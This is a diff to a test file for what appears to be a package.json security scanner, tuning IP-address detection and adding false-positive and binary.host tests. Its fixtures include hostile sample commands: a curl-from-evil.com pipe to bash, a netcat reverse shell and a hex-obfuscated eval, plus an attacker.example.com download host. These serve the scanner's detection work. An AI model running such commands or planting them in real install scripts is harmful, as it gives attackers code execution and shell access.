@@ -258,12 +258,16 @@ describe('analyzeScripts', () => {
         hack: 'curl http://evil.com | bash',
         reverse: 'nc -e /bin/sh 1.2.3.4',
         obfuscated: '\\x65\\x76\\x61\\x6c',
-        ip: 'ping 192.168.1.1',
+        // 192.168.1.1 is RFC1918 — no longer flagged as a public-IP literal
+        // (rule was a major FP source on LAN IPs in dev scripts).
+        ipPrivate: 'ping 192.168.1.1',
       },
     };
 
     const findings = analyzeScripts(pkgJson);
-    expect(findings).toHaveLength(7);
+    // 6 findings: destructive-rm, network-request, pipe-to-bash, netcat-shell,
+    // ip-address (1.2.3.4 only — 192.168.1.1 is RFC1918), hex-obfuscation.
+    expect(findings).toHaveLength(6);
     expect(findings).toEqual(
       expect.arrayContaining([
         expect.objectContaining({
@@ -283,11 +287,15 @@ describe('analyzeScripts', () => {
           severity: 'high',
         }),
         expect.objectContaining({
-          message: expect.stringContaining('IP address detected'),
+          message: expect.stringContaining('Public IP address literal'),
           severity: 'medium',
         }),
       ]),
     );
+    // Confirm RFC1918 LAN IPs are NOT flagged anymore.
+    expect(
+      findings.filter((f) => f.message.includes('192.168')),
+    ).toHaveLength(0);
   });
 
   test('should not flag safe scripts', () => {
@@ -299,6 +307,109 @@ describe('analyzeScripts', () => {
       },
     };
     const findings = analyzeScripts(pkgJson);
+    expect(findings).toHaveLength(0);
+  });
+});
+
+describe('Heuristic false-positive resistance', () => {
+  // eslint-disable-next-line @typescript-eslint/no-require-imports
+  const { analyzeScripts, analyzeManifest } = require('../src/index');
+
+  // Each entry asserts: a realistic, benign script that previously tripped a
+  // rule should NOT fire that rule anymore. Track regressions here when
+  // tightening patterns.
+  const benignScripts: Array<{ name: string; script: string; mustNotFire: string }> = [
+    { name: 'rfc1918-loopback', script: 'curl http://127.0.0.1:3000/health', mustNotFire: 'ip-address' },
+    { name: 'rfc1918-lan', script: 'echo "dev server at 192.168.1.10"', mustNotFire: 'ip-address' },
+    { name: 'docs-ip', script: 'echo "example: 192.0.2.42"', mustNotFire: 'ip-address' },
+    { name: 'semver-in-id', script: 'echo build-1.2.3.4-rc', mustNotFire: 'ip-address' },
+    { name: 'curl-help', script: 'curl --version', mustNotFire: 'network-request' },
+    { name: 'wget-no-url', script: 'wget --help', mustNotFire: 'network-request' },
+    { name: 'short-hash', script: 'echo "etag: 5f4dcc3b5aa765d61d8327deb882cf99"', mustNotFire: 'base64-string' },
+    { name: 'jwt-no-padding', script: 'echo "test token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.dummy"', mustNotFire: 'base64-string' },
+    { name: 'xor-fn-name', script: 'node -e "function xorBuffer(a,b){}"', mustNotFire: 'xor-obfuscation' },
+    { name: 'node-flag-doc', script: 'echo "use node -e to eval an expression"', mustNotFire: 'inline-exec' },
+    // Note on `rm -rf` inside an echo string: substring static analysis cannot
+    // distinguish doc strings from real commands without parsing the shell.
+    // Accepted limitation — the FP rate of `rm -rf` in real postinstall scripts
+    // is very low, so we keep the rule and live with this edge case.
+    { name: 'bun-runner', script: 'bun run dev', mustNotFire: 'execsync-nohup' },
+    { name: 'nc-help', script: 'nc --help', mustNotFire: 'netcat-shell' },
+  ];
+
+  test.each(benignScripts)('does not flag $name as $mustNotFire', ({ script, mustNotFire }) => {
+    const findings = analyzeScripts({ scripts: { build: script } });
+    const matchedRule = findings.find(
+      (f: { ruleId?: string }) => f.ruleId === mustNotFire,
+    );
+    if (matchedRule) {
+      // Helpful failure message that explains *what* fired so future regressions
+      // are easy to debug.
+      throw new Error(
+        `Expected no '${mustNotFire}' finding, got: ${JSON.stringify(matchedRule)}`,
+      );
+    }
+  });
+
+  test('analyzeManifest does not flag a normal package.json', () => {
+    const findings = analyzeManifest({
+      dependencies: { react: '^19.0.0', axios: '~1.7.0', lodash: '4.17.21' },
+      devDependencies: { jest: '^30.0.0', typescript: '^5.9.0' },
+      optionalDependencies: { fsevents: '^2.3.3' },
+      peerDependencies: { react: '^19.0.0' },
+    });
+    expect(findings).toHaveLength(0);
+  });
+
+  test('analyzeManifest does not flag a normal github: tag-ref dependency', () => {
+    // github:owner/repo without a 40-char commit pin is a common legit form.
+    const findings = analyzeManifest({
+      optionalDependencies: { 'my-fork': 'github:me/lib#v1.2.3' },
+    });
+    expect(findings.filter((f: { ruleId?: string }) => f.ruleId === 'commit-pinned-optional-dep')).toHaveLength(0);
+  });
+});
+
+describe('binary.host install-time fetch heuristic', () => {
+  // eslint-disable-next-line @typescript-eslint/no-require-imports
+  const { analyzeManifest } = require('../src/index');
+
+  test('flags a binary.host on an attacker-controlled domain', () => {
+    const findings = analyzeManifest({
+      binary: { host: 'https://attacker.example.com/prebuilds' },
+    });
+    expect(findings.map((f: { ruleId?: string }) => f.ruleId)).toContain('binary-host-unknown');
+  });
+
+  test('flags a malformed binary.host (not a valid URL)', () => {
+    const findings = analyzeManifest({ binary: { host: 'not a url at all' } });
+    expect(findings.map((f: { ruleId?: string }) => f.ruleId)).toContain('binary-host-unknown');
+  });
+
+  test('does NOT flag a binary.host on github.com (legit)', () => {
+    const findings = analyzeManifest({
+      binary: { host: 'https://github.com/myorg/native-mod/releases/download' },
+    });
+    expect(findings.filter((f: { ruleId?: string }) => f.ruleId === 'binary-host-unknown')).toHaveLength(0);
+  });
+
+  test('does NOT flag a binary.host on an S3 bucket (common legit pattern)', () => {
+    const findings = analyzeManifest({
+      binary: { host: 'https://my-prebuilds.s3.amazonaws.com' },
+    });
+    expect(findings.filter((f: { ruleId?: string }) => f.ruleId === 'binary-host-unknown')).toHaveLength(0);
+  });
+
+  test('does NOT flag a package without binary field', () => {
+    const findings = analyzeManifest({ dependencies: { react: '^19.0.0' } });
+    expect(findings.filter((f: { ruleId?: string }) => f.ruleId === 'binary-host-unknown')).toHaveLength(0);
+  });
+
+  test('respects suppressedRules for binary-host-unknown', () => {
+    const findings = analyzeManifest(
+      { binary: { host: 'https://attacker.example.com' } },
+      { suppressedRules: ['binary-host-unknown'] },
+    );
     expect(findings).toHaveLength(0);
   });
 });
